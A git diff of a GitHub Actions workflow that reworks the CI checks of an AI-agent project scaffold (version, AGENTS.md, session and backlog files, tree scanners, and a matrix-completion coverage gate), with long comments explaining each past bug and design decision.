@@ -33,48 +598,343 @@ jobs:
 
       - name: Check version file exists
         run: |
-          if [ ! -f "version" ]; then
-            echo "::warning::No version file found."
-          else
+          # A missing `version` is CORRECT for a repo that ships nothing — but only when
+          # it says so. Inferring the exemption from absence would turn a real omission
+          # into a silent pass. See ai/STANDARDS.md -> Versioning standard.
+          if [ -f "version" ]; then
             echo "Version: $(cat version)"
+          elif grep -qE '^<!--[[:space:]]*scaffold:no-artifact[[:space:]]*-->[[:space:]]*$' ai/STANDARDS.md 2>/dev/null; then
+            echo "No version file, and ai/STANDARDS.md declares scaffold:no-artifact — correct."
+          else
+            echo "::warning::No version file found. Create one, or declare scaffold:no-artifact in ai/STANDARDS.md if this repo ships nothing."
           fi
 
-      - name: Check AGENTS.md exists
+          # ONE DEFINITION, INVOKED — NOT REPRODUCED HERE.
+          #
+          # This step used to inline the whole rule, which meant the invariant could only be
+          # checked in CI. It therefore stopped being checked at all when Actions were blocked
+          # on 2026-08-13, and `.scaffold-version` drifted fourteen releases behind `version`
+          # in the repo where the two are the same file.
+          #
+          # Reimplementing it locally would have been the WRONG fix: two copies of one rule is
+          # this project's most repeated defect, and they disagree eventually. So the rule
+          # lives in tools/scaffold_version.sh --assert-consistent, and setup.sh, preflight
+          # and this step all call it.
+          tools/scaffold_version.sh --assert-consistent
+
+      - name: Check AGENTS.md exists and its commands are filled in
         run: |
           if [ ! -f "AGENTS.md" ]; then
+            # scaffold:also-local setup.sh --check — "[FAIL] AGENTS.md missing"
             echo "::error::Missing AGENTS.md hook file"
             exit 1
           fi
           echo "AGENTS.md present."
+          # AGENTS.md leads with a Project Commands table because agents act on commands
+          # and skim prose. Shipped with `[fill in]` placeholders, an unfilled table is
+          # worse than none: it looks authoritative and tells the agent nothing. Existence
+          # alone was the only thing checked, so a project could run for months with the
+          # single most actionable section still holding template text.
+          # `grep -c` PRINTS "0" AND EXITS 1 WHEN THERE ARE NO MATCHES, so `|| echo 0`
+          # appends a SECOND line and the variable becomes "0\n0". Every numeric test on it
+          # then dies with `[: integer expression expected`, the `if` takes the else branch,
+          # and the step prints a reassuring sentence containing a two-line number. Measured
+          # here on 2026-08-11: the SESSION.md check below could not fire AT ALL and reported
+          # "SESSION.md has 0\n0 session entries." on every run of every adopting repository.
+          # A check that cannot fail, reporting a number nobody compares to anything — the
+          # exact class this project keeps paying for. `|| true` keeps grep's own "0".
+          PLACEHOLDERS=$(grep -c '\[fill in' AGENTS.md 2>/dev/null || true)
+          case "$PLACEHOLDERS" in ''|*[!0-9]*) PLACEHOLDERS=0 ;; esac
+          # The scaffold template repo legitimately ships placeholders — it IS the
+          # template. A warning that always fires is one people learn to filter out.
+          #
+          # THE THIRD SIGNAL WAS `setup.sh` UNTIL 2026-08-11, AND THAT IS NOT THE PREDICATE.
+          # `is_upstream_repo()` in tools/scaffold_version.sh keys on overlays/ + OVERVIEW.md
+          # + .github/workflows/mirror-sync.yml, and setup.sh is the one file EVERY adopter
+          # has — so this copy was strictly weaker than the rule it was implementing. It
+          # happened not to misfire because no adopter carries overlays/ either, which is
+          # exactly how a drifted duplicate survives: correct by accident, in the two-copies
+          # shape ai/MEMORY.md names as this project's most repeated defect.
+          if [ -d overlays ] && [ -f OVERVIEW.md ] && [ -f .github/workflows/mirror-sync.yml ]; then
+            echo "Template repo — Project Commands placeholders expected, not checked."
+          elif [ "$PLACEHOLDERS" -gt 0 ]; then
+            echo "::warning::AGENTS.md still has $PLACEHOLDERS '[fill in]' placeholder(s) in its Project Commands table. Agents read that table first — fill it in or delete the rows that do not apply."
+            grep -n '\[fill in' AGENTS.md | head -6
+          else
+            echo "Project Commands table has no remaining placeholders."
+          fi
 
-      - name: Check SESSION.md has real entries
+      - name: Check SESSION.md is not just a template
         run: |
-          ENTRIES=$(grep -c "^## [0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}" ai/SESSION.md 2>/dev/null || echo "0")
-          if [ "$ENTRIES" -eq 0 ]; then
-            echo "::warning::ai/SESSION.md has no dated entries. Update at the end of every session."
+          # Warn if SESSION.md still only contains the template.
+          #
+          # THE BRACKET IS OPTIONAL. #96 was reported against setup.sh, but this check
+          # carried a byte-identical copy of the same pattern — a bare date, which the
+          # shipped `## [YYYY-MM-DD]` template can never produce. Two copies of one rule
+          # in two files is how a fix reaches one of them; the issue found the copy that
+          # printed to a human and missed the copy that printed to CI.
+          ENTRIES=$(grep -c "^## \[\?[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}" ai/SESSION.md 2>/dev/null || true)
+          case "$ENTRIES" in ''|*[!0-9]*) ENTRIES=0 ;; esac
+          # UPSTREAM THE TEMPLATE IS SUPPOSED TO BE EMPTY, and tools/preflight.sh FAILS if it
+          # is not: ai/SESSION.md ships to every adopter, so this repository's own history in
+          # it would be handed to all of them (that is what ai-project-scaffold-dev is for).
+          # Two rules in direct contradiction — one requiring the file be a template, the
+          # other warning that it is one — and the warning would fire on every run forever.
+          # Same A10 shape as the two localcoder warnings retired on 2026-08-12, and the same
+          # scoping the AGENTS.md placeholder check above has had since 0.15.0. This step was
+          # simply never given it, and could not be seen to need it while the count was
+          # broken (see the grep -c note above): it has not fired since the bug was
+          # introduced, so nobody ever read a permanent warning here.
+          if [ -d overlays ] && [ -f OVERVIEW.md ] && [ -f .github/workflows/mirror-sync.yml ]; then
+            echo "Template repo — ai/SESSION.md ships as a template; dated entries belong in ai-project-scaffold-dev."
+          elif [ "$ENTRIES" -eq 0 ]; then
+            echo "::warning::ai/SESSION.md has no dated session entries. Update it at the end of every session."
           else
             echo "SESSION.md has $ENTRIES session entries."
           fi
 
-      - name: Check BACKLOG.md has real tasks
+      - name: Report ai/ archive thresholds
         run: |
-          TASKS=$(grep -c "^\- \[" ai/BACKLOG.md 2>/dev/null || echo "0")
-          PLACEHOLDERS=$(grep -c "\[Task description\]" ai/BACKLOG.md 2>/dev/null || echo "0")
+          # Session-start files must stay small — see ai/STANDARDS.md → Archiving.
+          # Measured in a real adoption, SESSION.md reached 1001 lines against its own
+          # ~150 ceiling with the rule present and simply never applied.
+          # tools/session_archive.py is the single source of truth for the count (it
+          # excludes the template blocks a fresh scaffold ships with, which would
+          # otherwise consume retention slots).
+          #
+          # ADVISORY. This step reports and always exits 0. It was blocking from
+          # 2026-08-05 until 0.14.0, on the argument that a warning is precisely what
+          # was ignored on the way to 1,001 lines. That argument lost to a stronger one:
+          # a gate on file LENGTH stops the work in order to tidy the notes about the
+          # work, and it fires on whichever commit happens to cross the line — mid
+          # thought, in a PR about something else. ai/SECURITY.md's own rule is that a
+          # guard which blocks legitimate work gets disabled, and then it protects
+          # nothing. The accepted risk is recorded in ai/STANDARDS.md → Archiving.
+          # This step's own name said "SESSION.md" until 0.15.0 while the command below
+          # had covered all three files since 0.13.0.
+          #
+          # THE ESCAPE HATCH IS THE CEILING, NOT THE CHECK. Ceilings are per-project —
+          # edit the `scaffold:ceilings` marker in your own ai/STANDARDS.md, which no
+          # scaffold update overwrites. Raise it if your project genuinely needs more
+          # (MEMORY.md ships at 350 because a decision entry is an argument, not a log
+          # line), but do the archive pass first: "the ceiling is too low" and "I have
+          # not archived" look identical from inside the file, and only the pass tells
+          # you which you have.
+          if [ -x tools/session_archive.py ]; then
+            # --all covers every file with a stated ceiling, not just SESSION.md.
+            # STANDARDS names three; only one was ever enforced, and the other two were
+            # on exactly the footing SESSION.md was in when it reached 1001 lines.
+            # ADVISORY SINCE 0.14.0 — this reports and always exits 0. It is kept in CI
+            # because the report is the remedy: it names the oversized entries and the one
+            # command that fixes each. See ai/STANDARDS.md -> Archiving for why the gate
+            # was removed and what risk that accepts.
+            tools/session_archive.py --all --check
+          else
+            echo "::warning::tools/session_archive.py missing — no archive report was produced."
+          fi
+
+      - name: Check BACKLOG.md is not just a template
+        run: |
+          # Warn if BACKLOG.md still only has placeholder tasks
+          TASKS=$(grep -c "^\- \[" ai/BACKLOG.md 2>/dev/null || true)
+          PLACEHOLDERS=$(grep -c "\[Task description\]" ai/BACKLOG.md 2>/dev/null || true)
+          case "$TASKS" in ''|*[!0-9]*) TASKS=0 ;; esac
+          case "$PLACEHOLDERS" in ''|*[!0-9]*) PLACEHOLDERS=0 ;; esac
           REAL_TASKS=$((TASKS - PLACEHOLDERS))
-          if [ "$REAL_TASKS" -le 0 ]; then
-            echo "::warning::ai/BACKLOG.md has no real tasks."
+          # UPSTREAM THIS FILE IS THE TEMPLATE and every one of its tasks is a placeholder by
+          # construction, so REAL_TASKS is 0 forever and this warned on every run — the one
+          # annotation left after the checkout bump on 2026-08-12. The scaffold's real
+          # backlog lives in ai-project-scaffold-dev, which is an ADOPTION and where this
+          # check does exactly what it should. Same scoping as SESSION.md above.
+          if [ -d overlays ] && [ -f OVERVIEW.md ] && [ -f .github/workflows/mirror-sync.yml ]; then
+            echo "Template repo — ai/BACKLOG.md ships as a template; real tasks live in ai-project-scaffold-dev."
+          elif [ "$REAL_TASKS" -le 0 ]; then
+            echo "::warning::ai/BACKLOG.md has no real tasks. Add tasks as work begins."
           else
             echo "BACKLOG.md has $REAL_TASKS real tasks."
           fi
 
-      - name: Check no secrets in ai/ files
+      - name: Audit localcoder (offline checks)
         run: |
-          FOUND=0
-          if grep -rliE "(password|api_key|secret_key|Bearer )[=: ][A-Za-z0-9]" ai/ 2>/dev/null \
-            | grep -v "SECURITY.md" | grep -v "PLANNING.md" | grep -v "STANDARDS.md" | grep -v "CODING.md"; then
-            echo "::error::Possible credential found in ai/ files. Review and remove."
-            FOUND=1
+          # --offline runs only the checks that assert on prompt assembly, which happens
+          # before any network call — so no Ollama and no pulled model are needed. The
+          # three checks that need a real draft back are SKIPped and reported as skipped,
+          # never as passes. Run the full suite locally from whichever repo owns it.
+          # LOOK WHERE THE ADOPTER KEEPS ITS SUITE (#D-18). This step is vendored into
+          # every adopting project and searched only tools/. An adopter whose product
+          # lives elsewhere — localcoder keeps its suite in tests/, because tools/ there
+          # is this governance layer — got a ::warning::, which does not fail a build,
+          # and shipped unaudited behind a green tick for as long as anyone had looked.
+          AUDIT_SUITE=""
+          for c in tools/audit_localcoder.sh tests/audit_localcoder.sh; do
+            [ -x "$c" ] && { AUDIT_SUITE="$c"; break; }
+          done
+          # A WARNING THAT ALWAYS FIRES IS ONE PEOPLE LEARN TO FILTER OUT — this workflow's
+          # own rule, and after W-15 this warning described the INTENDED END STATE. The
+          # scaffold no longer ships localcoder, so absence is correct in this repository
+          # and in every adoption; only Robiton/localcoder, which vendors this workflow,
+          # has a suite to find. Reported from a real adoption running permanently green
+          # with two forever-warnings, of which this was one.
+          #
+          # Still RUN it where it exists — that is the half worth keeping (#D-18: localcoder
+          # kept its suite in tests/ and shipped unaudited behind a green tick for months).
+          # Absence is now a plain line, not a ::warning:: annotation.
+          if [ -n "$AUDIT_SUITE" ]; then
+            echo "running $AUDIT_SUITE --offline"
+            "$AUDIT_SUITE" --offline
+          else
+            echo "no audit_localcoder.sh here — expected since W-15; localcoder is a separate product."
           fi
-          if [ "$FOUND" -eq 0 ]; then
-            echo "No obvious secrets found in ai/ files."
+
+      - name: Run every tree scanner
+        run: |
+          # THE LOGIC LIVES IN tools/*_scan.sh, NOT HERE (#127), AND THEY ARE DISCOVERED.
+          #
+          # The secret scan was ~70 lines of shell in a `run:` block, where the only check
+          # on it was a proxy: `bash -n` covers script files and a workflow is YAML. This
+          # repo has already shipped a dropped `fi` that way. As files they are linted, and
+          # each carries a --selftest that the discovery step above finds automatically.
+          #
+          # NAMED, THIS STEP WOULD BE THE NEXT THING TO GO STALE. It listed secret_scan.sh
+          # alone; conflict_scan.sh arriving would have needed someone to remember to add a
+          # line here, which is precisely how guard_pretooluse.py's 33 cases sat unrun. The
+          # same "discovered, not listed" rule the selftest loop above already uses, applied
+          # to the family that is now plural.
+          #
+          # `_scan.sh` IS THE CONTRACT: a tree scanner takes no arguments, prints its
+          # findings, and exits non-zero when it has any.
+          #
+          # gitleaks is still the real secret tool (see the release checklist); these catch
+          # an obvious paste and an unresolved merge, and nothing more.
+          found=0
+          for f in tools/*_scan.sh; do
+            [ -x "$f" ] || continue
+            echo "── $f"
+            "$f" || exit 1
+            found=$((found + 1))
+          done
+          echo "$found tree scanner(s) passed"
+          if [ "$found" -eq 0 ]; then
+            echo "::warning::no tools/*_scan.sh were found — the secret and conflict scans did not run."
+          fi
+
+  # ONE STABLE CHECK NAME, BECAUSE THE MATRIX RENAMED THE OLD ONE.
+  #
+  # A matrixed job does not report as `scaffold-check`. It reports as
+  # `scaffold-check (ubuntu-latest)` — one context per leg, and the names change whenever
+  # SCAFFOLD_RUNNERS changes. Any adopter with a branch-protection rule requiring
+  # `scaffold-check` would therefore wait forever for a context that no longer exists:
+  # not a red PR, a PR that never becomes mergeable, which reads as a GitHub outage rather
+  # than as a configuration change we made to their repository.
+  #
+  # No repository in this fleet is affected today — these are private repos on a free plan,
+  # where branch protection is not available at all (the API answers 403 "Upgrade to
+  # GitHub Pro"). THAT IS EXACTLY WHY IT HAS TO BE HANDLED HERE. The blast radius is an
+  # adopter on a paid plan or in an organisation, who is precisely the adopter we do not
+  # get to test against before shipping into their repository.
+  #
+  # So: require THIS job. Its name never changes, it depends on every leg, and
+  # `if: always()` plus the explicit result test means a CANCELLED or SKIPPED matrix
+  # reports failure rather than quietly succeeding — a green built from an absence is the
+  # failure mode this whole file is written against.
+  scaffold-check-complete:
+    needs: scaffold-check
+    if: always()
+    permissions:
+      contents: read
+      # NEW, AND THE MINIMUM. This job reads its OWN run's job list to learn what each leg
+      # audited. Nothing here writes; `actions: read` is exactly that and nothing more.
+      actions: read
+    # Element 0 of the same variable, for the same reason mirror-sync uses it: on this
+    # fleet a hardcoded `ubuntu-latest` is a billing-blocked runner, so a gate pinned to
+    # hosted would never start and every PR would hang on it.
+    runs-on: ${{ fromJSON((github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository) && '["ubuntu-latest"]' || vars.SCAFFOLD_RUNNERS || (vars.SCAFFOLD_RUNNER && format('["{0}"]', vars.SCAFFOLD_RUNNER)) || '["ubuntu-latest"]')[0] }}
+    # Raised from 2 when this job stopped being a single `echo` and gained a checkout and
+    # an artifact download. A ceiling that fits yesterday's job turns a slow cold runner
+    # into a red build with nothing wrong with it.
+    timeout-minutes: 6
+    steps:
+      - name: Every runner passed
+        run: |
+          set -euo pipefail
+          echo "scaffold-check result: ${{ needs.scaffold-check.result }}"
+          if [ "${{ needs.scaffold-check.result }}" != "success" ]; then
+            # The GATE ITSELF is local: tools/preflight.sh runs the same gates each leg runs.
+            # What cannot be checked locally is the FAN-OUT — one machine here, and the whole
+            # point of the matrix is the platforms this machine is not.
+            # scaffold:ci-only  no local equivalent: a single machine cannot observe whether
+            # every matrix leg passed. Must sit within 3 lines of the ::error:: to count.
+            echo "::error::scaffold-check did not succeed on every runner (${{ needs.scaffold-check.result }})."
+            exit 1
+          fi
+          echo "all matrix legs green"
+
+      # ---------------------------------------------------------------------------------
+      # EVERY LEG GAPPED IS A FAILURE. Brian's decision, 2026-09-22, after this fleet was
+      # measured: some legs GAP -> warning (unchanged); EVERY leg GAP -> red. No
+      # provisioning required.
+      #
+      # WHY IT IS HERE AND NOT IN THE LEG. A leg knows its own result and nothing else.
+      # "Not one runner audited this" is not a fact any leg can observe, so no per-leg
+      # step can decide it -- this is the only job that sees them all.
+      #
+      # The steps above already fail when a leg fails. What they CANNOT see is the case
+      # where every leg passes and every leg examined nothing: the fleet is audited today
+      # only because one macOS runner happens to carry shellcheck and zizmor. Retire that
+      # box and every leg warns, every leg is green, and a fleet with zero coverage
+      # reports exactly like a covered one.
+      - name: Checkout
+        if: always()
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+
+      - name: Something must have audited this
+        if: always()
+        env:
+          # The job's own token, read-only and scoped by the `permissions:` block below.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          COV_OUTPUTS: ${{ toJSON(needs.scaffold-check.outputs) }}
+          COV_RUNNERS: ${{ (github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository) && '["ubuntu-latest"]' || vars.SCAFFOLD_RUNNERS || (vars.SCAFFOLD_RUNNER && format('["{0}"]', vars.SCAFFOLD_RUNNER)) || '["ubuntu-latest"]' }}
+        run: |
+          set -euo pipefail
+          # NO ARTIFACT: the first version of this used actions/upload-artifact and failed on
+          # both legs with "Artifact storage quota has been hit" while this repository stored
+          # ZERO artifacts -- the quota is account-wide.
+          mkdir -p .audit-coverage
+          # FIRST, THE LEGS' JOB OUTPUTS. No listing and no wait: see "Publish this leg's
+          # coverage". Exit 3 means a leg did not report, and only then is the API read.
+          expected="$(printf '%s' "$COV_RUNNERS" | python3 -c 'import json,sys; print(len(json.load(sys.stdin)))')"
+          printf '%s' "$COV_OUTPUTS" > .audit-coverage-outputs.json
+          orc=0
+          tools/audit_coverage.sh --from-outputs .audit-coverage-outputs.json .audit-coverage "$expected" || orc=$?
+          if [ "$orc" = "2" ]; then
+            # scaffold:ci-only  no local equivalent: job outputs exist only inside a CI run.
+            # Must sit within 3 lines of the ::error:: to count.
+            echo "::error::a leg published coverage this tool cannot read -- see the line above."
+            exit 1
+          fi
+          if [ "$orc" != "0" ]; then
+            rm -rf .audit-coverage; mkdir -p .audit-coverage
+            # FALLBACK: the legs' own step conclusions from the jobs API. ?filter=all, because
+            # after "Re-run failed jobs" the default listing holds only this job; --settled
+            # keeps each job's latest attempt and is never satisfied by a listing with no leg.
+            # GitHub has published steps over 100s late, so this waits up to 180s.
+            waited=0
+            for _ in $(seq 1 36); do
+              gh api "/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/jobs?filter=all" --paginate \
+                > .audit-coverage-jobs.json
+              if tools/audit_coverage.sh --settled .audit-coverage-jobs.json; then waited=0; break; fi
+              waited=1; sleep 5
+            done
+            if [ "$waited" = "1" ]; then
+              echo "::warning::GitHub had not published every leg's steps after 180s; coverage is read from what was there."
+            fi
+            tools/audit_coverage.sh --from-jobs .audit-coverage-jobs.json .audit-coverage
+          fi
+          rc=0
+          tools/audit_coverage.sh --check .audit-coverage || rc=$?
+          if [ "$rc" != "0" ]; then
+            # scaffold:ci-only  no local equivalent: one machine cannot observe whether ANY
+            # leg of a fan-out produced a verdict. Must sit within 3 lines of the ::error::.
+            echo "::error::nothing on this fleet audited one or more gates — a result nobody produced is not a pass."
+            exit 1
           fi
